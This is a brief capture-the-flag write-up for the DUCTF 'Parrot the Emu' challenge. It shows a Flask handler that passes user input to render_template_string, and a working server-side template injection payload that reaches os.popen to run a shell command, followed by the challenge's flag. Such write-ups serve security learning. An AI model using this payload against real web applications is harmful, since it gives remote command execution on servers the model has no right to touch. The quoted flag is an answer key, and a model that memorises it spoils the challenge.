# Parrot the Emu
Solved by **XXX**

## Question
It is so nice to hear Parrot the Emu talk back.

## Solution
Analysing the `app.py` shows this website is vulnerable to **Template** injection.
```
 if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)
```

```
{{''.__class__.__mro__[1].__subclasses__()[207].__init__.__globals__['sys'].modules['os'].popen("cat flag").read() }}
```

### Flag
`DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`
